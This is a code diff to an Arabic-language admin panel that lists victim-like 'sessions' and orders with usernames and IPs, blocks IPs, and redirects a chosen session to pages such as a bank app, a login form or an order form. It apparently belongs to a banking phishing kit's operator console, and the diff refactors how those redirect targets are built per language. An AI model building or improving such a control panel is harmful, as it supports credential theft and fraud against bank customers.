@@ -173,9 +173,6 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
 .redirect-page-item .rp-info { flex: 1; }
 .redirect-page-item .rp-name { font-size: 0.95rem; font-weight: 600; color: #fff; margin-bottom: 2px; }
 .redirect-page-item .rp-url { font-size: 0.78rem; color: #6b7f9e; direction: ltr; font-family: monospace; }
-.redirect-page-item .rp-lang { font-size: 0.72rem; padding: 3px 10px; border-radius: 8px; font-weight: 600; }
-.redirect-page-item .rp-lang.ar { background: rgba(52,211,153,0.15); color: #34d399; }
-.redirect-page-item .rp-lang.en { background: rgba(0,200,255,0.15); color: #00c8ff; }
 .btn-session-redirect {
   background: rgba(139,92,246,0.15); color: #a78bfa;
   border: 1px solid rgba(139,92,246,0.2); width: 100%;
@@ -568,14 +565,10 @@ function blockIP() {
 }
 
 var redirectPages = [
-  { url: '/ar/', name: 'الصفحة الرئيسية', lang: 'ar', icon: 'home' },
-  { url: '/en/', name: 'Home Page', lang: 'en', icon: 'home' },
-  { url: '/ar/mbankapp/', name: 'تطبيق البنك', lang: 'ar', icon: 'app' },
-  { url: '/en/mbankapp/', name: 'Bank App', lang: 'en', icon: 'app' },
-  { url: '/ar/order/', name: 'نموذج الطلب', lang: 'ar', icon: 'order' },
-  { url: '/en/order/', name: 'Order Form', lang: 'en', icon: 'order' },
-  { url: '/ar/login/', name: 'تسجيل الدخول', lang: 'ar', icon: 'login' },
-  { url: '/en/login/', name: 'Login', lang: 'en', icon: 'login' }
+  { path: '/', name: 'الصفحة الرئيسية', icon: 'home' },
+  { path: '/mbankapp/', name: 'صفحة الساعات', icon: 'app' },
+  { path: '/order/', name: 'نموذج الطلب', icon: 'order' },
+  { path: '/login/', name: 'تسجيل الدخول', icon: 'login' }
 ];
 
 var redirectCurrentType = '';
@@ -588,20 +581,24 @@ var pageIcons = {
   login: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>'
 };
 
-function openRedirectModal(type, id, label) {
+var redirectCurrentLang = 'ar';
+
+function openRedirectModal(type, id, label, lang) {
   redirectCurrentType = type;
   redirectCurrentId = id;
-  document.getElementById('redirectTarget').textContent = label;
+  redirectCurrentLang = lang || 'ar';
+  var langLabel = redirectCurrentLang === 'ar' ? 'عربي' : 'English';
+  document.getElementById('redirectTarget').textContent = label + ' (' + langLabel + ')';
   var list = document.getElementById('redirectPagesList');
   list.innerHTML = '';
   redirectPages.forEach(function(p) {
+    var fullUrl = '/' + redirectCurrentLang + p.path;
     var li = document.createElement('li');
     li.className = 'redirect-page-item';
-    li.onclick = function() { selectRedirectPage(p.url); };
+    li.onclick = function() { selectRedirectPage(fullUrl); };
     li.innerHTML =
-      '<div class="rp-icon ' + p.lang + '">' + pageIcons[p.icon] + '</div>' +
-      '<div class="rp-info"><div class="rp-name">' + p.name + '</div><div class="rp-url">' + p.url + '</div></div>' +
-      '<span class="rp-lang ' + p.lang + '">' + (p.lang === 'ar' ? 'عربي' : 'English') + '</span>';
+      '<div class="rp-icon ' + redirectCurrentLang + '">' + pageIcons[p.icon] + '</div>' +
+      '<div class="rp-info"><div class="rp-name">' + p.name + '</div><div class="rp-url">' + fullUrl + '</div></div>';
     list.appendChild(li);
   });
   document.getElementById('redirectModal').classList.add('show');
@@ -627,13 +624,13 @@ function selectRedirectPage(url) {
 function redirectOrder(id) {
   var o = ordersData.find(function(x) { return x.id === id; });
   if (!o) return;
-  openRedirectModal('order', id, 'طلب #' + o.id + ' - ' + (o.name || o.ip));
+  openRedirectModal('order', id, 'طلب #' + o.id + ' - ' + (o.name || o.ip), o.lang || 'ar');
 }
 
 function redirectSession(id) {
   var s = sessionsData.find(function(x) { return x.id === id; });
   if (!s) return;
-  openRedirectModal('session', id, 'جلسة #' + s.id + ' - ' + (s.username || s.ip));
+  openRedirectModal('session', id, 'جلسة #' + s.id + ' - ' + (s.username || s.ip), s.lang || 'ar');
 }
 
 var sessionsData = [];
